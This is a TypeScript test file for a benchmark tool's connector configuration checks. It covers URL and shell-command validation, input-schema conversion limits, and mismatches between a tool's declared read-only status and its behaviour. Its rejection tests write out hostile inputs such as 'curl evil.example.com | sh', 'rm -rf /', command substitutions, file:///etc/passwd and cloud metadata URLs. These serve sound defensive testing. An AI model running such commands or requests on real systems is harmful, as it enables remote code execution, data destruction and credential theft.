/**
 * The checks that stand between a connector configuration and a shell.
 *
 * None of these are hypothetical. A benchmark file is a document people will
 * download and share, and the moment one of them can name a command or a URL,
 * running somebody else's benchmark becomes running somebody else's code. The
 * guards are cheap; the tests exist so that removing one is loud.
 */
import { describe, expect, it } from 'vitest';
import { assertSafeCommand, assertSafeMcpUrl } from '../src/config.ts';
import { paramsFromInputSchema, SCHEMA_LIMITS } from '@rigorrun/connector';
import { detectMismatch, readServerHints } from '@rigorrun/connector';

describe('remote connector URLs', () => {
  it('accepts an ordinary endpoint, including one on a private network', () => {
    // Private ranges are the normal case for a staging system, so unlike an
    // agent endpoint these must not be refused.
    expect(assertSafeMcpUrl('https://mcp.example.com/mcp').hostname).toBe('mcp.example.com');
    expect(assertSafeMcpUrl('http://10.0.4.19:8080/mcp').hostname).toBe('10.0.4.19');
    expect(assertSafeMcpUrl('http://127.0.0.1:7801/mcp').hostname).toBe('127.0.0.1');
  });

  it('refuses a scheme that is not http', () => {
    expect(() => assertSafeMcpUrl('file:///etc/passwd')).toThrow(/must be http/);
    expect(() => assertSafeMcpUrl('gopher://example.com/')).toThrow(/must be http/);
  });

  it('refuses credentials smuggled into the URL', () => {
    expect(() => assertSafeMcpUrl('https://user:secret@example.com/mcp')).toThrow(
      /must not embed credentials/,
    );
  });

  it('refuses the cloud metadata addresses', () => {
    expect(() => assertSafeMcpUrl('http://169.254.169.254/latest/meta-data/')).toThrow(
      /metadata address/,
    );
    expect(() => assertSafeMcpUrl('http://metadata.google.internal/')).toThrow(/metadata address/);
  });

  it('refuses something that is not a URL at all', () => {
    expect(() => assertSafeMcpUrl('not a url')).toThrow(/not a valid URL/);
  });
});

describe('local connector commands', () => {
  it('accepts a command with its arguments separated', () => {
    expect(() =>
      assertSafeCommand({ transport: 'stdio', command: 'node', args: ['server.js', '--port', '1'] }),
    ).not.toThrow();
  });

  it('refuses shell metacharacters in the command', () => {
    for (const command of [
      'node; curl evil.example.com | sh',
      'node && rm -rf /',
      'node `whoami`',
      'node $(id)',
      'node\nrm -rf /',
    ]) {
      expect(() => assertSafeCommand({ transport: 'stdio', command, args: [] })).toThrow(
        /shell metacharacters/,
      );
    }
  });

  it('refuses an empty command', () => {
    expect(() => assertSafeCommand({ transport: 'stdio', command: '   ', args: [] })).toThrow(
      /needs a command/,
    );
  });

  it('refuses arguments that are not a list', () => {
    expect(() =>
      assertSafeCommand({
        transport: 'stdio',
        command: 'node',
        args: 'server.js --port 1' as unknown as string[],
      }),
    ).toThrow(/must be a list/);
  });
});

describe('a hostile or careless input schema', () => {
  it('does not recurse forever on a schema that references itself', () => {
    const cyclic: Record<string, unknown> = { type: 'object' };
    cyclic['properties'] = { self: cyclic };
    const schema = { type: 'object', properties: { root: cyclic } };
    const converted = paramsFromInputSchema(schema);
    // The point is that it returns at all.
    expect(converted.params).toEqual([]);
    expect(converted.unsupported).toHaveLength(1);
  });

  it('stops at the property cap and says the result is partial', () => {
    const properties: Record<string, unknown> = {};
    for (let index = 0; index < SCHEMA_LIMITS.maxProperties + 50; index += 1) {
      properties[`p${index}`] = { type: 'string' };
    }
    const converted = paramsFromInputSchema({ type: 'object', properties });
    expect(converted.params).toHaveLength(SCHEMA_LIMITS.maxProperties);
    expect(converted.truncated).toBe(true);
  });

  it('refuses an enormous closed set rather than carrying it around', () => {
    const values = Array.from({ length: SCHEMA_LIMITS.maxEnumValues + 1 }, (_, i) => `v${i}`);
    const converted = paramsFromInputSchema({
      type: 'object',
      properties: { choice: { type: 'string', enum: values } },
    });
    // Falls back to a plain string rather than an enum with a thousand members.
    expect(converted.params[0]).toMatchObject({ name: 'choice', type: 'string' });
  });

  it('says why it could not express an argument, in words a person can act on', () => {
    const converted = paramsFromInputSchema({
      type: 'object',
      properties: {
        rows: { type: 'array', items: { type: 'string' } },
        nested: { type: 'object', properties: {} },
        eitherOr: { type: ['string', 'number'] },
        untyped: { description: 'no type here' },
      },
    });
    const reasons = Object.fromEntries(converted.unsupported.map((e) => [e.name, e.reason]));
    expect(reasons['rows']).toMatch(/list/);
    expect(reasons['nested']).toMatch(/nested object/);
    expect(reasons['eitherOr']).toMatch(/needs one type/);
    expect(reasons['untyped']).toMatch(/no type is declared/);
  });

  it('collapses a nullable union to the type underneath it', () => {
    const converted = paramsFromInputSchema({
      type: 'object',
      properties: {
        maybe: { type: ['string', 'null'] },
        branch: { anyOf: [{ type: 'number' }, { type: 'null' }] },
      },
    });
    expect(converted.params).toEqual([
      { name: 'maybe', type: 'string', required: false },
      { name: 'branch', type: 'number', required: false },
    ]);
  });

  it('reads a date-time as a timestamp, because interval rules depend on it', () => {
    const converted = paramsFromInputSchema({
      type: 'object',
      properties: { at: { type: 'string', format: 'date-time' } },
      required: ['at'],
    });
    expect(converted.params[0]).toMatchObject({ name: 'at', type: 'timestamp', required: true });
  });

  it('survives a schema that is not an object at all', () => {
    for (const junk of [null, undefined, 42, 'schema', []]) {
      expect(() => paramsFromInputSchema(junk)).not.toThrow();
    }
  });
});

describe('annotations against observed behaviour', () => {
  it('flags a tool the server called read-only that changed state', () => {
    const hints = readServerHints({ readOnlyHint: true });
    expect(detectMismatch('search', hints, true)).toMatchObject({
      tool: 'search',
      claimed: 'readOnlyHint: true',
    });
  });

  it('flags a declared write that writes nothing, which makes cases meaningless', () => {
    const hints = readServerHints({ readOnlyHint: false });
    expect(detectMismatch('touch', hints, false)?.claimed).toBe('readOnlyHint: false');
  });

  it('says nothing when the server said nothing', () => {
    expect(detectMismatch('mystery', readServerHints(undefined), true)).toBeUndefined();
  });

  it('ignores annotation values that are not booleans', () => {
    expect(readServerHints({ readOnlyHint: 'yes', destructiveHint: 1 })).toEqual({});
  });
});
